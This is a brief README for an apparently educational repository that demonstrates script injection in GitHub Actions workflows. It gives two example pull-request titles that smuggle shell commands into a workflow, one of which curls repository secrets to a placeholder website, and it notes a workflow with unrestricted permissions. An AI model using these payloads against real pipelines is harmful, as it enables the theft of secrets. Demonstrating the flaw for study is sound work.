# Example Repo

This is a super simple example repository!

## Structure
* 'script-injection.yml'
  * Workflow vulnerable to script injection
    * Create a PR with title `a";echo Got your secrets"`
      * Echo in workflow execution
    * Create a PR with title `a";curl http:/...MyWebSite...?abc=$YourSecrets"`
      * Extract your secrets and curl to your website
* 'label-issues-real.yml'
  * Workflow which assigns the bug label when the issue's title contains bug word
    * It could make whatever since we aren't restricting workflow's permissions